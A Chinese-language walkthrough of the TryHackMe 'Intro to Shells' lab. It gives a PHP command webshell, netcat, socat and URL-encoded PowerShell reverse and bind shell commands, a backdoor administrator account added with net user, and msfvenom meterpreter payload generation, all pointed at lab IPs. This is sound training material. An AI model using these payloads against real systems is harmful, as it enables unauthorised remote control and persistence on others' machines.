### webshell

#### 本文相关的TryHackMe实验房间链接：https://tryhackme.com/room/introtoshells
1. 尝试将 Webshel​​l 上传到Linux机器，然后使用以下命令：`nc <LOCAL-IP> <PORT> -e /bin/bash`将反向 shell 发送回您自己计算机上等待的侦听器。

  - `nc -nlvp 1234`
  - 创建php文件 webshell.php
      ```php 
      <?php
        if(isset($_GET['cmd']))
        {
            system($_GET['cmd']);
        }
        ?>
      ```
   - 打开被攻击的网址`http://10.10.57.248/`,上传webshell.php
   - 构建url `http://10.10.57.248/uploads/webshell.php?cmd=nc 10.10.21.196 1234 -e /bin/bash`,后面的参数ip为你本地的ip端口为你nc监听的端口(简单说这一步就是访问你刚才上传的文件并传入命令执行)。
   - 然后查看nc 看到连接成功

2. 导航到/usr/share/webshells/php/php-reverse-shell.phpKali 并更改 IP 和端口，以将您的 tun0 IP 与自定义端口相匹配。设置 netcat 监听器，然后上传并激活 shell。
  - 连接ssh `ssh shell@10.10.149.6`
  - 执行 `mkfifo /tmp/f; nc -lvnp 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
  - 执行 `nc 10.10.149.6 4444` 此处的ip是目标机的ip
  - 成功  

3. 在 Windows 目标上上传 Webshel​​l 并尝试使用 Powershell 获取反向 shell。
  - `nc -nlvp 1234`
  - 创建php文件 webshell.php
      ```php 
      <?php
        if(isset($_GET['cmd']))
        {
            system($_GET['cmd']);
        }
        ?>
      ```
   - 打开被攻击的网址`http://10.10.57.248/`,上传webshell.php
   - 构建url `http://10.10.57.248/uploads/webshell.php?cmd=powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.10.194.117%27%2C1234%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22`,后面的参数ip为你本地的ip端口为你nc监听的端口(简单说这一步就是访问你刚才上传的文件并传入命令执行)。
   - 然后查看nc 看到连接成功

4. 网络服务器正在以系统权限运行。创建一个新用户并将其添加到“管理员”组，然后通过 RDP 或 WinRM 登录。
  - 使用刚才获取的shell
  - `net user test test123 /add`               #添加新用户
    `net localgroup administrators test /add`  #添加用户到管理员组  
  - 使用新用户登录 `xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.91.116 /u:test /p:'test123'`

5. 要求：尝试使用 socat 和 netcat 在 Windows 目标上获得反向和绑定 shell。
 netcat反向shell
    - 目标机ip：10.10.234.86    攻击机ip：10.10.249.251
    - Netcat反向shell, 在攻击者终端:`nc -lvnp 12345`
    - 然后使用 RDP 登录到目标的管理员账户,使用攻击机终端 通过RDP登录到目标系统的管理员账户
  `xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.234.86 /u:Administrator /p:'TryH4ckM3!'`
    - 在 cmd 上输入以下内容:nc 10.10.249.251 12345 -e"cmd.exe"
    - 返回刚才创建的shell查看，成功建立netcat反向shell

  netcat绑定shell  
   - 现在正好相反，在目标机的cmd上启动一个 netcat 监听器: 
      `nc -lvnp 12345 -e "cmd.exe"  # -e和"cmd.exe"之间有空格和没有空格 执行结果一样`
   - 在攻击者的电脑上运行以下命令: `nc 10.10.234.86 12345`
   - 成功绑定shell  
   
 Socat绑定shell
  - 在目标机器的 cmd 上启动一个监听器（注意：socat监听器在执行监听时没有提示语）:   
  `socat TCP-L:12345 EXEC:powershell.exe,pipes`
  - 然后在攻击者的电脑上  
  `socat TCP:10.10.234.86:12345 -`
  - 成功绑定shell  

 Socat反向shell
  - 在攻击者的终端上设置socat监听器（注意：socat监听器在执行监听时没有提示语）:  
  `socat TCP-L:12345 -`
  - 然后在目标机器的 cmd 中运行以下命令
  `socat TCP:10.10.249.251:12345 EXEC:powershell.exe,pipes`
  - 成功建立Socat反向shell  

6. 使用 msfvenom 创建 64 位 Windows Meterpreter shell 并将其上传到 Windows Target。激活 shell 并使用 multi/handler 捕获它。尝试一下这个 shell 的功能。
 - 目标机ip：10.10.245.66  
  攻击机ip：10.10.244.218
 - 使用 msfvenom创建payload(包括 shell)的语法如下:  
  `msfvenom -p <PAYLOAD> <OPTIONS>`  
  在攻击机上运行(会生成一个shell.exe)：
  `msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=10.10.244.218 LPORT=12345`
  - 在攻击机上执行以下操作来设置 multi/handler:  
   1. 使用 `msfconsole` 命令打开 Metasploit
   2. 输入命令: `use multi/handler`
   3. 输入 `show options` 命令来查看不同的选项
   4. 设置PAYLOAD参数 (`set payload windows/x64/meterpreter/reverse_tcp`), LHOST参数 (攻击机ip)(`set LHOST 10.10.244.218`) 以及LPORT参数(`set LPORT 12345`)
  - 在目标机器上调用shell.exe文件
  - 在攻击机界面获得一个Meterpreter shell  

7. 为任一目标创建分阶段和无阶段的 meterpreter shell。上传并手动激活它们，用netcat捕获 shell——这有效吗？  
  不能，我们需要使用msf里面的multi/handler模块捕获meterpreter shell，用netcat并不能使这个shell正常工作。



  参考文章：[【THM】What the shell？-学习(下)](https://www.cnblogs.com/Hekeats-L/p/16769018.html)